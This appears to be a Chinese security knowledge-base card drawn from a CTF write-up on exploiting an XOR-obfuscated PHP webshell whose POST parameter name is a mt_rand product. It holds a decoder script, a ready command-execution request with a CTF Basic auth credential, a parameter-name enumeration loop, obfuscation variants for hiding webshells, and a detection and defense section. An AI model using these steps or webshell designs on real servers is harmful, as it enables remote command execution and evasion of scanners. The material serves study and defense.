---
id: web-php-rce-webshell-xor-random-product-param-name
title: PHP XOR 混淆 Webshell 的动态参数名：本地还原 $_GET/_POST 与回调名，用 mt_rand 乘积（约 300 种）作 POST 变量名执行命令
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-xor-obfuscation-random-product-param-name
aliases:
- XOR 混淆 webshell
- mt_rand 乘积参数名
- 动态 POST 参数名
- $_GET[Nhhb]($_POST[product])
- webshell 变量名还原
- 有限乘积空间爆破参数名
tags:
- php
- webshell
- obfuscation
- xor
- mt-rand
- parameter-name
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V599
  verified_at: '2026-11-12T17:07:55+08:00'
  notes: 已对照原文与10图：图03 Intruder base64 c3lzdGVtOjEyMzQ1Ng== 200/4190 命中system:123456；图04 本地echo还原_GET/_POST/Nhhb及乘积4021958；图05 访问注释隐藏php得服务器乘积4054162+ls回显；图06 cat flag.php得flag且响应以4054162开头；图07-10 测试二登录/前端注释泄露SQL/注册页。卡内乘积示例4054162、Basic头、cat+flag.php、空格须用+等与原文一致；卡面已注明原文29×11=319估算有误、实际11×28=308。dedup top候选(xor藏函数名/取反/栅栏/变量函数)为不同混淆载体与参数名机制，非同链，new成立。原文无组件版本。未验证点：未复跑PoC；测试二未打通属原文事实，skip理由成立。
---

## 一句话结论

页面源码用字符串异或拼接出 `$_GET`、`_POST` 与回调参数名，并把 `mt_rand(2012,2022) * mt_rand(1997,2024)` 的乘积当作 POST 变量名执行命令（`@$_GET['Nhhb']($_POST[$product])`）；把异或表达式复制到本地 echo 就能还原 `_GET`/`_POST`/`Nhhb`，乘积只有约 300 种可能且页面/被注释文件会回显该值，拿到乘积后发 `?Nhhb=system` + `product=ls` 即可命令执行。

## 原理

- **字符串异或是逐字节运算**：PHP 对两个等长字符串做 `^` 时按字节异或，两个可打印字符可以得到任意目标字符。源码里 `("`"^"?")`、`(":"^"}")` 等四组表达式拼起来就是 `_GET`；同理 `_POST` 与回调名 `Nhhb`。文件里因此不出现 `$_GET`、`$_POST`、`system` 等完整特征，能绕过部分静态查杀。
- **变量函数调用结构**：`${$__}[$____]` 等价于 `$_GET['Nhhb']`，`${$___}[$_____]` 等价于 `$_POST[<乘积>]`，最终 `@$_GET[Nhhb]($_POST[$_____])` 就是“用 GET 参数 Nhhb 指定函数名、用 POST 参数（名为乘积）传参”的一句话木马变体。
- **为什么参数名可以不预测种子**：虽然 `mt_rand()` 未显式 `mt_srand` 时种子自动生成、直接预测种子不现实，但两个 `mt_rand(min,max)` 的取值范围很小（11 与 28 个取值），乘积空间只有 11×28=308 种（原文按 29×11=319 估算）。把 308 个乘积逐个作为 POST 参数名发送，命令总会命中；服务端还会 `echo $_____`，页面响应开头直接带出本次乘积，注释里的隐藏 php（`#show_source('au2c7ts62gs1ush13.php')`）也会回显该值，所以通常无需爆破。
- **响应同时暴露参数名与命令回显**：执行时先 `echo $_____` 再执行传入函数，所以响应形如 `<乘积><命令输出>`；例如 `ls` 的响应以乘积开头、后面是目录列表，天然确认参数名猜对。
- **入口**：本例站点整体是 Basic 认证，先通过“固定常见口令、枚举用户名”的方式拿到低权账号（`system/123456`），进入后才看到上述页面源码；认证层与 Webshell 层是两个独立问题。

## 触发条件

- 能访问到 PHP 页面源码或得到混淆代码片段（挑战页、源码泄露、备份文件、登录后展示等）。
- 页面把“函数名/超全局变量名/回调参数名”用异或、base64、取反等方式混淆，但混淆表达式可在本地执行还原。
- 动态参数名来自有限取值集合（小范围 `mt_rand` 的乘积、时间、哈希截断等），或页面/隐藏文件会回显该值。
- 目标 PHP 允许动态函数调用且命令执行函数未被禁用（`system`、`passthru`、`shell_exec` 等）。

## 利用步骤

1. 拿到页面源码，把异或表达式原样复制到本地 PHP 文件并 `echo`（或在线 PHP 沙箱执行），还原出 `_GET`、`_POST` 与回调名 `Nhhb`。
2. 按还原结果重写调用：`@$_GET['Nhhb']($_POST[$product]);`，确认乘积变量 `$product` 的来源（两个 `mt_rand` 范围值相乘）。
3. 获取乘积：优先访问源码注释提到的隐藏文件（如 `#show_source('au2c7ts62gs1ush13.php')`）或直接请求当前页面，读取响应开头回显的数字；取不到时枚举 11×28 个乘积作为 POST 参数名逐个尝试。
4. 构造请求：`POST /au2c7ts62gs1ush13.php?Nhhb=system`，body 为 `<乘积>=<命令>`，带上已获得的 Basic 认证头（如 `Authorization: Basic c3lzdGVtOjEyMzQ1Ng==` 对应 system:123456）。
5. 先执行无空格命令验证（`ls`、`id`），再按需执行带空格命令；原文明示 `$a($b)` 形式无需给命令加引号，且空格编码要用 `+`（作者用 `%20` 时命令未执行，改 `+` 后成功）。
6. 读取目标文件（如 `cat+flag.php`）验证危害后停止。

## PoC

本地还原混淆名：

```php
<?php
$__  = ("`"^"?").(":"^"}").("%"^"`").("{"^"/");      // _GET
$___ = ("$"^"{").("~"^".").("/"^"`").("-"^"~").("("^"|"); // _POST
$____= ("t"^":").(":"^"R").(":"^"R").("X"^":");      // Nhhb
echo $__ . "\n" . $___ . "\n" . $____ . "\n";
?>
```

构造命令执行请求（乘积示例 4054162，实际以页面/隐藏文件回显为准）：

```http
POST /au2c7ts62gs1ush13.php?Nhhb=system HTTP/1.1
Host: target
Authorization: Basic c3lzdGVtOjEyMzQ1Ng==
Content-Type: application/x-www-form-urlencoded

4054162=cat+flag.php
```

乘积枚举思路（伪代码）：

```php
for ($x = 2012; $x <= 2022; $x++)
  for ($y = 1997; $y <= 2024; $y++)
    $candidates[] = $x * $y;   // 去重后约 300 个候选参数名
```

## 变体与关联

- **参数名来源变体**：乘积可换成 `date('Ymd')`、`md5(固定盐)`、会话 ID 截断、自增计数等；只要取值空间可枚举或可观察，同样可发。
- **混淆手法变体**：除异或外，可用按位取反 `~`、`str_rot13`、`base64_decode`、字符数组下标重组；还原思路都是“把表达式在本地跑一遍 echo”。
- **同类 PHP 混淆马分析**：XOR 逐字符藏函数名见 `[[web-php-rce-webshell-xor-encoded-function-name]]`（本卡藏的是超全局变量名/回调名，并多一层随机参数名）；栅栏加密藏 `assert` 见 `[[web-php-rce-webshell-railfence-function-name-helper-post]]`；按位取反 + 可变变量见 `[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]`；分片重建函数名见 `[[web-php-rce-webshell-name-rebuild-callback-goto-multilayer]]`。
- **入口关联**：Basic 认证的 `Authorization: Basic base64(user:pass)` 爆破与头部构造见 `[[web-java-component-tomcat-manager-basic-weak-auth-war-deploy]]`（产品不同但头部机制一致）。

## 检测与防御

- **服务端**：禁用不必要的动态函数调用与危险函数（`disable_functions`），启用 `open_basedir`；Web 目录只读、定期做 webshell 扫描与文件完整性比对。
- **扫描器**：对 PHP 文件先做静态还原（常量折叠、异或/取反/base64 解码）再匹配 `$_GET[...]($_POST[...])`、变量函数调用等数据流特征；单看字面关键字会被这类混淆绕过。
- **移除调试回显**：不要把随机乘积、内部路径等调试信息 echo 到响应里；源码注释中的隐藏文件/备份文件要从生产环境清理。
- **检测信号**：同一路径短时间内出现大量参数名不同、值相似的 POST 请求（参数名枚举爆破）；Basic 认证 401→200 的批量尝试；Web 进程派生出 `system`/`sh`/`cmd` 子进程。
- **认证加固**：Basic 认证使用强口令、限制失败次数并配合 MFA/网关防护，避免弱口令成为入口。
